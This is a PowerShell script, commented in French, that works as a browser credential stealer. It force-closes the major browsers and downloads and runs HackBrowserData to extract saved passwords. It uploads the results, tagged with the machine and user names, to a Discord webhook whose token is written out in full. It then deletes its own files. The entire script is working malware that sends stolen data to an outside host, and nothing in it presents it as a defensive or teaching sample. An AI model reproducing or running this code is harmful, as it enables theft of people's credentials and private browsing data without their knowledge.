$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

function Send-Discord {
    param([string]$msg)
    try {
        $Body = @{content=$msg} | ConvertTo-Json
        Invoke-RestMethod -Uri $wh -Method Post -Body $Body -ContentType 'application/json' | Out-Null
    } catch {}
}

Send-Discord "🟢 **START** - $env:COMPUTERNAME | $env:USERNAME"

# Tuer navigateurs
Get-Process chrome,msedge,firefox,brave,opera -EA 0 | Stop-Process -Force -EA 0
Start-Sleep 5

Set-Location $env:TEMP
Remove-Item hbd.zip,HBD,results.zip -Recurse -Force -EA 0

Send-Discord "📥 **Downloading HackBrowserData...**"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    # Lien SourceForge officiel - CELUI QUI MARCHE
    $url = "https://sourceforge.net/projects/hackbrowserdata.mirror/files/v0.4.6/hack-browser-data-windows-64bit.zip/download"
    
    Invoke-WebRequest -Uri $url -OutFile "hbd.zip" -UseBasicParsing -TimeoutSec 30
    
    if (!(Test-Path "hbd.zip")) {
        Send-Discord "❌ **Download failed**"
        exit
    }
    
    $fileSize = (Get-Item "hbd.zip").Length
    Send-Discord "✅ **Downloaded** - $([math]::Round($fileSize/1KB,2)) KB"
    
    Send-Discord "📦 **Extracting...**"
    Expand-Archive -Path "hbd.zip" -DestinationPath "HBD" -Force
    
    Set-Location "HBD"
    
    # Trouver l'exe (le nom peut varier)
    $exe = Get-ChildItem -Filter "*.exe" -Recurse | Select-Object -First 1
    
    if (!$exe) {
        Send-Discord "❌ **EXE not found**"
        exit
    }
    
    Send-Discord "🔓 **Extracting passwords...**"
    
    # Exécuter HackBrowserData
    & $exe.FullName all 2>&1 | Out-Null
    
    Start-Sleep 5
    
    # Chercher les résultats
    $resultFiles = Get-ChildItem -Filter "*.zip" -Recurse | Where-Object {$_.Name -like "*result*"}
    
    if ($resultFiles) {
        $resultFile = $resultFiles[0]
        $size = [math]::Round($resultFile.Length / 1KB, 2)
        
        Send-Discord "📤 **Uploading $size KB...**"
        
        $date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        curl.exe -F "file=@$($resultFile.FullName)" -F "content=🔑 **PASSWORDS EXTRACTED**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Size:** $size KB`n**Date:** $date" $wh
        
        Send-Discord "✅ **UPLOAD SUCCESS**"
    }
    elseif (Test-Path "results") {
        # Fallback : compresser le dossier results
        Send-Discord "📦 **Creating archive...**"
        Compress-Archive -Path "results\*" -DestinationPath "output.zip" -Force
        
        if (Test-Path "output.zip") {
            curl.exe -F "file=@output.zip" -F "content=📁 **Data from $env:COMPUTERNAME**" $wh
            Send-Discord "✅ **Fallback upload done**"
        }
    }
    else {
        Send-Discord "❌ **No results found**"
    }
    
} catch {
    $err = $_.Exception.Message -replace '"',"'"
    Send-Discord "❌ **Error:** $err"
}

Set-Location $env:TEMP
Start-Sleep 2
Remove-Item HBD,hbd.zip -Recurse -Force -EA 0

Send-Discord "🧹 **FINISHED**"
